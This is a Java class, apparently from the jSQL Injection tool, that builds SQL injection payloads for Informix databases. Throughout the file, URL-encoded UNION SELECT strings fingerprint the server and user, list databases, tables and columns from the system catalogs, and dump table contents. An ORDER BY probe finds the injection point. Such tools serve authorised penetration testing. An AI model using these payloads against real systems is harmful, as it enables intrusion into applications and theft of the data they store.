package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class InformixStrategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "SELECT+trim(DBINFO('version','full')||'{%}'||DBSERVERNAME||'{%}'||USER||'{%}'||USER||'%01%03%03%07')r+FROM+TABLE(SET{1})";
    }

    @Override
    public String getSchemaList() {
        return 
            "select+rr||'%01%03%03%07'+r+from(select'%04'||trim(t.name)||'%050%04'rr+" +
            "from(select+distinct+name+from+sysdatabases)t,(select+distinct+name+from+sysdatabases)t1+" +
            "where+t.name>=t1.name+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getTableList(Database database) {
        return 
            "select+rr||'%01%03%03%07'+r+from(select+'%04'||trim(t.tabname)||'%050%04'rr+" +
            "from(select+distinct+tabname+from+" + database + ":systables)t,(select+distinct+tabname+from+" + database + ":systables)t1+" +
            "where+t.tabname>=t1.tabname+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getColumnList(Table table) {
        return 
            "select+rr||'%01%03%03%07'+r+from(select+'%04'||trim(t.colname)||'%050%04'rr+" +
            "from(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t,(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t1+" +
            "where+t.colname>=t1.colname+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        formatListColumn = formatListColumn.replace("{%}", ",''))||'%7f'||trim(nvl(");
        formatListColumn = "trim(nvl(" + formatListColumn + ",''))";

        return 
            "select+rr||'%01%03%03%07'+r+from(select'%04'||trim(t.s)||'%050%04'rr+" +
            "from(select+distinct+" + formatListColumn +"s+from+" + database + ":" + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ":" + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+1{limit})a";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
            "select'SQLi'||substr(r," + startPosition + ",32767)from(" + sqlQuery + ")x";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select(1337"+ i +"7330%2b1)||''FROM+TABLE(SET{1})";
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from(" + replaceTag + ")b+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
    
    @Override
    public String getDbLabel() {
        return null;
    }
}